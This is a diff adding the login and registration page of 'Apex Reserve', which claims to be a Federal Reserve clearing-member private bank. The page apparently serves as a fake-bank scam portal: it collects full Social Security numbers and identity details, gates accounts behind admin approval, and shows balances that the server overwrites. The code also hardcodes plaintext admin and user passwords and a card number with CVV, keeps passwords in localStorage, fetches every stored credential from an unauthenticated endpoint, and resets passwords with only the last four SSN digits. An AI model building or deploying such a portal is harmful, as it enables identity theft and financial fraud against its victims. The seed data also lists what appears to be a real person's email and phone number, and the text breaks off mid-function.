@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apex Reserve | Private Wealth & Digital Banking Access</title>
+  <meta name="description" content="Sign in or register for an Apex Reserve Private Wealth account. Manage high-tier digital wealth and instant Fedwire transfers.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .auth-page-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 20px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .auth-brand-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 32px;
+      text-align: center;
+    }
+
+    .auth-brand-logo {
+      width: 54px;
+      height: 54px;
+      border-radius: var(--radius-md);
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(59, 130, 246, 0.2));
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 30px rgba(16, 185, 129, 0.25);
+    }
+
+    .auth-card {
+      width: 100%;
+      max-width: 580px;
+      background: rgba(14, 18, 27, 0.88);
+      border: 1px solid var(--border-card);
+      border-radius: var(--radius-xl);
+      padding: 36px 40px;
+      box-shadow: 0 24px 64px rgba(0, 0, 0, 0.65), 0 0 40px rgba(16, 185, 129, 0.08);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      position: relative;
+    }
+
+    .auth-tabs-nav {
+      display: flex;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border-subtle);
+      border-radius: var(--radius-md);
+      padding: 4px;
+      margin-bottom: 28px;
+    }
+
+    .auth-tab-btn {
+      flex: 1;
+      padding: 10px 16px;
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      font-weight: 600;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      transition: all var(--transition-fast);
+      text-align: center;
+    }
+
+    .auth-tab-btn.active {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      color: #ffffff;
+      box-shadow: 0 4px 16px rgba(16, 185, 129, 0.35);
+    }
+
+    .auth-tab-pane {
+      display: none;
+    }
+
+    .auth-tab-pane.active {
+      display: block;
+      animation: fadeIn 0.25s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .auth-form-title {
+      font-size: 1.55rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.02em;
+      margin-bottom: 6px;
+    }
+
+    .auth-form-sub {
+      font-size: 0.88rem;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .auth-error-box {
+      background: rgba(244, 63, 94, 0.12);
+      border: 1px solid rgba(244, 63, 94, 0.35);
+      border-radius: var(--radius-md);
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      color: #f43f5e;
+      font-weight: 600;
+      font-size: 0.88rem;
+    }
+
+    .auth-success-box {
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      border-radius: var(--radius-md);
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      color: var(--emerald-light);
+      font-weight: 600;
+      font-size: 0.88rem;
+    }
+
+    /* Password input box wrapper and visibility toggle eye icon */
+    .password-input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+      width: 100%;
+    }
+
+    .password-input-wrap .form-control {
+      padding-right: 44px !important;
+      width: 100%;
+    }
+
+    .btn-toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      padding: 6px;
+      margin: 0;
+      color: #94a3b8;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 6px;
+      transition: color 0.18s ease, background-color 0.18s ease, transform 0.18s ease;
+      z-index: 5;
+    }
+
+    .btn-toggle-password:hover {
+      color: #ffffff;
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    .btn-toggle-password:active {
+      transform: translateY(-50%) scale(0.92);
+    }
+
+    .btn-toggle-password svg {
+      display: block;
+      transition: transform 0.15s ease;
+    }
+  </style>
+</head>
+<body>
+  <!-- Ambient background glow spheres -->
+  <div class="ambient-glow glow-1"></div>
+  <div class="ambient-glow glow-2"></div>
+  <div class="ambient-glow glow-3"></div>
+
+  <!-- Notification Toast Container -->
+  <div class="toast-stack" id="toastStack"></div>
+
+  <div class="auth-page-container">
+    <!-- Brand Header -->
+    <div class="auth-brand-header">
+      <div class="auth-brand-logo">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="url(#brandGradAuth)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M2 17L12 22L22 17" stroke="url(#brandGradAuth)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M2 12L12 17L22 12" stroke="url(#brandGradAuth)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+          <defs>
+            <linearGradient id="brandGradAuth" x1="2" y1="2" x2="22" y2="22" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#10B981" />
+              <stop offset="1" stop-color="#3B82F6" />
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <div>
+        <h1 style="font-size: 1.6rem; font-weight: 800; letter-spacing: -0.01em; color: #fff;">APEX RESERVE</h1>
+        <p style="font-size: 0.8rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.06em; margin-top: 2px;">
+          Federal Reserve RTGS Clearing Member • Private Wealth
+        </p>
+      </div>
+    </div>
+
+    <!-- Main Auth Card -->
+    <div class="auth-card">
+      
+      <!-- Nav Tabs: Sign In vs Register -->
+      <div class="auth-tabs-nav">
+        <button class="auth-tab-btn active" id="tabBtnSignIn">Sign In</button>
+        <button class="auth-tab-btn" id="tabBtnRegister">Register New Account</button>
+      </div>
+
+      <!-- ============================================== -->
+      <!-- PANE 1: SIGN IN FORM                           -->
+      <!-- ============================================== -->
+      <div class="auth-tab-pane active" id="paneSignIn">
+        <h2 class="auth-form-title">Welcome to Apex Reserve</h2>
+        <p class="auth-form-sub">Sign in with your registered username or email address.</p>
+
+        <!-- Inactivity Timeout Banner -->
+        <div class="auth-timeout-box" id="sessionTimeoutBox" style="display: none; padding: 12px 16px; margin-bottom: 20px; border-radius: var(--radius-md); background: rgba(245, 158, 11, 0.12); border: 1px solid rgba(245, 158, 11, 0.4); color: #FBBF24; font-size: 0.88rem; align-items: center; gap: 12px;">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <div>
+            <strong>Session Timed Out:</strong> You have been automatically signed out after 5 minutes of inactivity for security.
+          </div>
+        </div>
+
+        <!-- Dynamic Error Banner -->
+        <div class="auth-error-box" id="signInErrorBox">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          <span id="signInErrorText">User does not exist</span>
+        </div>
+
+        <form id="signInForm">
+          <div class="form-group">
+            <label class="field-label" for="loginUsernameInput">Registration Email or Username *</label>
+            <input type="text" id="loginUsernameInput" class="form-control" placeholder="e.g. manechris20@gmail.com or chris" required autocomplete="username">
+          </div>
+
+          <div class="form-group">
+            <div style="display: flex; justify-content: space-between; align-items: baseline;">
+              <label class="field-label" for="loginPasswordInput">Security Passcode / Password *</label>
+              <a href="#" id="forgotPasswordLink" style="color: var(--emerald-light); font-size: 0.78rem; text-decoration: none; font-weight: 600; cursor: pointer;">Forgot Password?</a>
+            </div>
+            <div class="password-input-wrap">
+              <input type="password" id="loginPasswordInput" class="form-control" placeholder="••••••••••••" required autocomplete="current-password">
+              <button type="button" class="btn-toggle-password" id="toggleLoginPasswordBtn" title="Show password" aria-label="Show password">
+                <svg class="eye-show" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+                <svg class="eye-hide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <button type="submit" class="btn btn-primary" id="btnSubmitLogin" style="width: 100%; justify-content: center; padding: 13px; font-size: 0.95rem; margin-top: 8px;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+            <span>Sign In to Account</span>
+          </button>
+
+          <div style="text-align: center; margin-top: 18px; font-size: 0.82rem; color: var(--text-dim);">
+            Forgot your passcode? <a href="#" id="inlineForgotLink" style="color: var(--emerald-light); text-decoration: none; font-weight: 600; cursor: pointer;">Reset Password here</a>
+          </div>
+        </form>
+      </div>
+
+      <!-- ============================================== -->
+      <!-- PANE 2: REGISTER NEW ACCOUNT FORM              -->
+      <!-- ============================================== -->
+      <div class="auth-tab-pane" id="paneRegister">
+        <h2 class="auth-form-title">Open Private Account</h2>
+        <p class="auth-form-sub">Submit your identity details for Federal Reserve RTGS clearing verification.</p>
+
+        <!-- Registration Status / Error Banner -->
+        <div class="auth-error-box" id="regErrorBox">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          <span id="regErrorText">Registration error</span>
+        </div>
+
+        <form id="registerForm">
+          <!-- Full Name & Username -->
+          <div class="form-grid-2">
+            <div class="form-group">
+              <label class="field-label" for="regFullName">Full Legal Name *</label>
+              <input type="text" id="regFullName" class="form-control" placeholder="e.g. Eleanor Vance" required>
+            </div>
+            <div class="form-group">
+              <label class="field-label" for="regUsername">Choose Username *</label>
+              <input type="text" id="regUsername" class="form-control" placeholder="e.g. eleanor_vance" required>
+            </div>
+          </div>
+
+          <!-- Email & Phone -->
+          <div class="form-grid-2">
+            <div class="form-group">
+              <label class="field-label" for="regEmail">Email Address *</label>
+              <input type="email" id="regEmail" class="form-control" placeholder="e.g. eleanor@vancecap.com" required>
+            </div>
+            <div class="form-group">
+              <label class="field-label" for="regPhone">Phone Number *</label>
+              <input type="tel" id="regPhone" class="form-control" placeholder="+1 (555) 392-1084" required>
+            </div>
+          </div>
+
+          <!-- Account Type Selection (Checking or Savings) & Date of Birth -->
+          <div class="form-grid-2">
+            <div class="form-group">
+              <label class="field-label" for="regAccountType">Account Type Required *</label>
+              <select id="regAccountType" class="form-control" style="background: rgba(255,255,255,0.05); color: #fff;" required>
+                <option value="Checking Account" style="background: #0f172a;">Private Checking Account</option>
+                <option value="Savings Account" style="background: #0f172a;">High-Yield Reserve Savings</option>
+                <option value="Checking & Savings" style="background: #0f172a;">Combined Checking & Savings</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label class="field-label" for="regDob">Date of Birth *</label>
+              <input type="date" id="regDob" class="form-control" value="1992-05-18" required style="color: #fff;">
+            </div>
+          </div>
+
+          <!-- SSN & Password -->
+          <div class="form-grid-2">
+            <div class="form-group">
+              <label class="field-label" for="regSsn">Social Security Number (SSN) *</label>
+              <input type="text" id="regSsn" class="form-control font-mono" placeholder="XXX-XX-XXXX" maxlength="11" required>
+              <span style="font-size: 0.68rem; color: var(--text-dim); margin-top: 4px; display: block;">Required for FinCEN KYC verification.</span>
+            </div>
+            <div class="form-group">
+              <label class="field-label" for="regPassword">Security Password *</label>
+              <div class="password-input-wrap">
+                <input type="password" id="regPassword" class="form-control font-mono" placeholder="Minimum 6 characters" required>
+                <button type="button" class="btn-toggle-password" id="toggleRegPasswordBtn" title="Show password" aria-label="Show password">
+                  <svg class="eye-show" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                  </svg>
+                  <svg class="eye-hide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Residential Address -->
+          <div class="form-group">
+            <label class="field-label" for="regAddress">Residential Address *</label>
+            <input type="text" id="regAddress" class="form-control" placeholder="Street, City, State, ZIP" required>
+          </div>
+
+          <!-- Compliance Notice Box -->
+          <div style="background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.28); border-radius: var(--radius-md); padding: 14px 16px; margin: 16px 0;">
+            <div style="display: flex; gap: 10px; align-items: flex-start;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" stroke-width="2" style="flex-shrink: 0; margin-top: 2px;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              <div style="font-size: 0.78rem; color: var(--text-muted); line-height: 1.5;">
+                <strong style="color: #F59E0B;">Compliance Notice:</strong> Your account will be created with status <strong style="color: #fff;">PENDING</strong> and an initial balance of <strong style="color: #fff;">$0.00</strong>. Once the Admin clicks <strong style="color: #34D399;">Accept</strong> in the Admin Dashboard, your account will open with your personal details and $0.
+              </div>
+            </div>
+          </div>
+
+          <button type="submit" class="btn btn-primary" id="btnSubmitRegister" style="width: 100%; justify-content: center; padding: 13px; font-size: 0.95rem;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><line x1="19" y1="8" x2="19" y2="14"/><line x1="22" y1="11" x2="16" y2="11"/></svg>
+            <span>Submit Registration for Verification</span>
+          </button>
+
+          <div style="text-align: center; margin-top: 18px; font-size: 0.82rem; color: var(--text-dim);">
+            Already have an account? <a href="#" id="regGoToSignInLink" style="color: var(--emerald-light); text-decoration: none; font-weight: 600; cursor: pointer;">Sign In</a> • <a href="#" id="regForgotLink" style="color: var(--emerald-light); text-decoration: none; font-weight: 600; cursor: pointer;">Forgot Password?</a>
+          </div>
+        </form>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================== -->
+  <!-- MODAL: RESET / FORGOT PASSWORD                 -->
+  <!-- ============================================== -->
+  <div class="modal-overlay" id="resetPasswordModalOverlay">
+    <div class="modal-card modal-send" style="max-width: 460px;">
+      <div class="modal-header">
+        <div class="modal-header-text">
+          <div class="modal-pill">
+            <span class="pulse-indicator"></span>
+            <span>Security & Passcode Recovery</span>
+          </div>
+          <h2 class="modal-title">Reset Password</h2>
+          <p class="modal-desc">Enter your account details to set a new security password.</p>
+        </div>
+        <button class="modal-close-btn" id="closeResetPasswordModalBtn" title="Close">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" x2="6" y1="6" y2="18"/><line x1="6" x2="18" y1="6" y2="18"/></svg>
+        </button>
+      </div>
+
+      <form id="resetPasswordForm" class="modal-body">
+        <div class="auth-error-box" id="resetErrorBox" style="display: none;">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          <span id="resetErrorText">Error</span>
+        </div>
+        <div class="auth-success-box" id="resetSuccessBox" style="display: none;">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+          <span id="resetSuccessText">Success</span>
+        </div>
+
+        <div class="form-group">
+          <label class="field-label" for="resetUsernameInput">Username or Registered Email *</label>
+          <input type="text" id="resetUsernameInput" class="form-control" placeholder="e.g. alexander or your_username" required>
+        </div>
+
+        <div class="form-group">
+          <label class="field-label" for="resetSsnInput">Last 4 Digits of SSN (Identity Verification) *</label>
+          <input type="text" id="resetSsnInput" class="form-control font-mono" placeholder="e.g. 9402" maxlength="4" required>
+        </div>
+
+        <div class="form-group">
+          <label class="field-label" for="resetNewPasswordInput">New Security Password *</label>
+          <div class="password-input-wrap">
+            <input type="password" id="resetNewPasswordInput" class="form-control font-mono" placeholder="Minimum 4 characters" required>
+            <button type="button" class="btn-toggle-password" title="Show password" aria-label="Show password">
+              <svg class="eye-show" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+              <svg class="eye-hide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                <line x1="1" y1="1" x2="23" y2="23"></line>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="field-label" for="resetConfirmPasswordInput">Confirm New Password *</label>
+          <div class="password-input-wrap">
+            <input type="password" id="resetConfirmPasswordInput" class="form-control font-mono" placeholder="Re-enter new password" required>
+            <button type="button" class="btn-toggle-password" title="Show password" aria-label="Show password">
+              <svg class="eye-show" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+              <svg class="eye-hide" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                <line x1="1" y1="1" x2="23" y2="23"></line>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="modal-footer-actions">
+          <button type="button" class="btn btn-ghost" id="cancelResetPasswordBtn">Cancel</button>
+          <button type="submit" class="btn btn-primary" id="btnSubmitReset">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-2-2l2 2"/><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span>Update Password</span>
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Tab Switching logic
+    const tabBtnSignIn = document.getElementById('tabBtnSignIn');
+    const tabBtnRegister = document.getElementById('tabBtnRegister');
+    const paneSignIn = document.getElementById('paneSignIn');
+    const paneRegister = document.getElementById('paneRegister');
+
+    tabBtnSignIn.addEventListener('click', () => {
+      tabBtnSignIn.classList.add('active');
+      tabBtnRegister.classList.remove('active');
+      paneSignIn.classList.add('active');
+      paneRegister.classList.remove('active');
+    });
+
+    tabBtnRegister.addEventListener('click', () => {
+      tabBtnRegister.classList.add('active');
+      tabBtnSignIn.classList.remove('active');
+      paneRegister.classList.add('active');
+      paneSignIn.classList.remove('active');
+    });
+
+    // Automatic tab selection based on URL hash or parameters (e.g. login.html#register)
+    function applyUrlAuthTab() {
+      const hash = window.location.hash.toLowerCase();
+      const search = window.location.search.toLowerCase();
+      if (search.includes('timeout=true')) {
+        const timeoutBox = document.getElementById('sessionTimeoutBox');
+        if (timeoutBox) timeoutBox.style.display = 'flex';
+      }
+      if (hash === '#register' || hash === '#signup' || search.includes('register') || search.includes('signup')) {
+        tabBtnRegister.click();
+      } else {
+        tabBtnSignIn.click();
+      }
+    }
+    applyUrlAuthTab();
+    window.addEventListener('hashchange', applyUrlAuthTab);
+
+    function getBackendUrl(path) {
+      if (window.location.port === '8080') {
+        return path;
+      }
+      return 'http://localhost:8080' + path;
+    }
+
+    // Seed accounts fallback for both HTTP and file:/// execution
+    const SEED_ACCOUNTS = [
+      {
+        id: 'usr_demo_alexander',
+        username: 'alexander',
+        password: 'password123',
+        name: 'Alexander Reed',
+        email: 'alexander.reed@apexreserve.com',
+        phone: '+1 (212) 555-0199',
+        dob: '1988-06-14',
+        accountType: 'Checking & Savings',
+        ssn: '***-**-9402',
+        address: '740 Park Ave, Apt 12B, New York, NY 10021',
+        role: 'user',
+        status: 'approved',
+        accountNumber: '#8920-410',
+        fullAccountNumber: '89204109402',
+        routing: '021000089',
+        tier: 'Tier 1 Elite Private',
+        totalBalance: 500000.00,
+        checkingBalance: 420000.00,
+        savingsBalance: 80000.00,
+        cardNumber: '4920 8812 3904 7721',
+        cardExp: '09/29',
+        cardCvv: '739',
+        isCardFrozen: false,
+        transactions: [
+          {
+            id: 'TX-8821-FED-4011',
+            type: 'inflow',
+            title: 'Morgan Stanley Institutional',
+            category: 'Treasury Wire',
+            method: 'Fedwire Inbound',
+            date: 'Today, 10:14 AM',
+            amount: 125000.00,
+            status: 'Settled',
+            note: 'Q3 Asset Dividend Reinvestment'
+          }
+        ]
+      },
+      {
+        id: 'usr_admin_compliance',
+        username: 'admin',
+        password: 'admin123',
+        name: 'Apex Compliance Officer',
+        email: 'admin@apexreserve.com',
+        phone: '+1 (212) 555-0100',
+        role: 'admin',
+        status: 'approved',
+        accountNumber: '#ADMIN-001',
+        fullAccountNumber: '89200000001',
+        routing: '021000089',
+        tier: 'Executive Compliance Administrator',
+        totalBalance: 0.00,
+        checkingBalance: 0.00,
+        savingsBalance: 0.00
+      },
+      {
+        id: 'usr_chris_registered',
+        username: 'chris',
+        password: 'password123',
+        name: 'Chis Mane',
+        email: 'manechris20@gmail.com',
+        phone: '+2347049045720',
+        dob: '1991-08-20',
+        accountType: 'Checking Account',
+        ssn: '***-**-1234',
+        address: '450 Lexington Ave, New York, NY',
+        role: 'user',
+        status: 'approved',
+        accountNumber: '#8920-430',
+        fullAccountNumber: '89204104301',
+        routing: '021000089',
+        tier: 'Private Client Reserve',
+        totalBalance: 100000.00,
+        checkingBalance: 100000.00,
+        savingsBalance: 0.00
+      }
+    ];
+
+    // =========================================================================
+    // IMMUTABLE CREDENTIALS VAULT (CLIENT ENGINE)
+    // Guarantees that any password reset by the user or admin is permanently
+    // remembered across all website upgrades, cache clears, or seed re-inits.
+    // =========================================================================
+    const PERMANENT_CREDENTIALS_KEY = 'APEX_PERMANENT_CREDENTIALS_V1';
+    const BACKUP_CREDENTIALS_KEY = 'APEX_PASSWORD_VAULT_BACKUP';
+
+    function getPermanentCredentials() {
+      try {
+        const raw = localStorage.getItem(PERMANENT_CREDENTIALS_KEY) || localStorage.getItem(BACKUP_CREDENTIALS_KEY);
+        if (raw) {
+          const parsed = JSON.parse(raw);
+          if (parsed && typeof parsed === 'object') return parsed;
+        }
+      } catch (e) {}
+      return {};
+    }
+
+    function savePermanentCredential(userOrIdentifier, newPassword) {
+      if (!newPassword) return;
+      try {
+        const creds = getPermanentCredentials();
+        const now = new Date().toISOString();
+        const entry = { password: newPassword, updatedAt: now };
+
+        if (typeof userOrIdentifier === 'string') {
+          const key = userOrIdentifier.trim().toLowerCase();
+          if (key) creds[key] = entry;
+        } else if (userOrIdentifier && typeof userOrIdentifier === 'object') {
+          if (userOrIdentifier.id) creds[String(userOrIdentifier.id).toLowerCase()] = entry;
+          if (userOrIdentifier.username) creds[String(userOrIdentifier.username).toLowerCase()] = entry;
+          if (userOrIdentifier.email) creds[String(userOrIdentifier.email).toLowerCase()] = entry;
+        }
+        localStorage.setItem(PERMANENT_CREDENTIALS_KEY, JSON.stringify(creds));
+        localStorage.setItem(BACKUP_CREDENTIALS_KEY, JSON.stringify(creds));
+      } catch (e) {}
+    }
+
+    function applyPermanentCredentials(accountsList) {
+      if (!Array.isArray(accountsList)) return accountsList;
+      const creds = getPermanentCredentials();
+      accountsList.forEach(acc => {
+        const idKey = (acc.id || '').toLowerCase();
+        const uKey = (acc.username || '').toLowerCase();
+        const eKey = (acc.email || '').toLowerCase();
+        const match = creds[idKey] || creds[uKey] || creds[eKey];
+        if (match && match.password) {
+          acc.password = match.password;
+          acc.isCustomPassword = true;
+          acc.passwordUpdatedAt = match.updatedAt;
+        }
+      });
+      return accountsList;
+    }
+
+    // =========================================================================
+    // IMMUTABLE BALANCE VAULT (PERSISTENT BALANCES & LEDGER ENGINE)
+    // =========================================================================
+    const PERMANENT_BALANCES_KEY = 'APEX_PERMANENT_BALANCES_V2';
+    const BACKUP_BALANCES_KEY = 'APEX_BALANCE_VAULT_BACKUP_V2';
+
+    function getPermanentBalances() {
+      try {
+        const raw = localStorage.getItem(PERMANENT_BALANCES_KEY) || localStorage.getItem(BACKUP_BALANCES_KEY);
+        if (raw) {
+          const parsed = JSON.parse(raw);
+          if (parsed && typeof parsed === 'object') return parsed;
+        }
+      } catch (e) {}
+      return {};
+    }
+
+    function applyPermanentBalances(accountsList) {
+      if (!Array.isArray(accountsList)) return accountsList;
+      const vault = getPermanentBalances();
+      accountsList.forEach(acc => {
+        const idKey = (acc.id || '').toLowerCase();
+        const uKey = (acc.username || '').toLowerCase();
+        const eKey = (acc.email || '').toLowerCase();
+        const match = vault[idKey] || vault[uKey] || vault[eKey];
+        if (match && typeof match.checkingBalance === 'number') {
+          acc.checkingBalance = match.checkingBalance;
+          acc.savingsBalance = match.savingsBalance !== undefined ? match.savingsBalance : acc.savingsBalance;
+          acc.totalBalance = match.totalBalance;
+          if (Array.isArray(match.transactions) && match.transactions.length > 0) {
+            acc.transactions = match.transactions;
+          }
+        }
+      });
+      return accountsList;
+    }
+
+    async function syncPermanentBalancesFromServer() {
+      try {
+        const res = await fetch(getBackendUrl('/api/balances/permanent'));
+        if (res.ok) {
+          const data = await res.json();
+          if (data && data.balances) {
+            const local = getPermanentBalances();
+            let changed = false;
+            for (const key of Object.keys(data.balances)) {
+              const serverEntry = data.balances[key];
+              if (serverEntry && typeof serverEntry.checkingBalance === 'number') {
+                if (!local[key] || new Date(serverEntry.updatedAt || 0) >= new Date(local[key].updatedAt || 0)) {
+                  local[key] = serverEntry;
+                  changed = true;
+                }
+              }
+            }
+            if (changed) {
+              localStorage.setItem(PERMANENT_BALANCES_KEY, JSON.stringify(local));
+              localStorage.setItem(BACKUP_BALANCES_KEY, JSON.stringify(local));
+              const accounts = getAllLocalAccounts();
+              localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(accounts));
+            }
+          }
+        }
+      } catch (e) {}
+    }
+    syncPermanentBalancesFromServer();
+
+    // Auto-sync permanent credentials from server vault on boot
+    async function syncPermanentCredentialsFromServer() {
+      try {
+        const res = await fetch(getBackendUrl('/api/credentials/permanent'));
+        if (res.ok) {
+          const data = await res.json();
+          if (data && data.credentials) {
+            const local = getPermanentCredentials();
+            let changed = false;
+            for (const key of Object.keys(data.credentials)) {
+              const serverEntry = data.credentials[key];
+              if (serverEntry && serverEntry.password) {
+                if (!local[key] || local[key].password !== serverEntry.password) {
+                  local[key] = serverEntry;
+                  changed = true;
+                }
+              }
+            }
+            if (changed) {
+              localStorage.setItem(PERMANENT_CREDENTIALS_KEY, JSON.stringify(local));
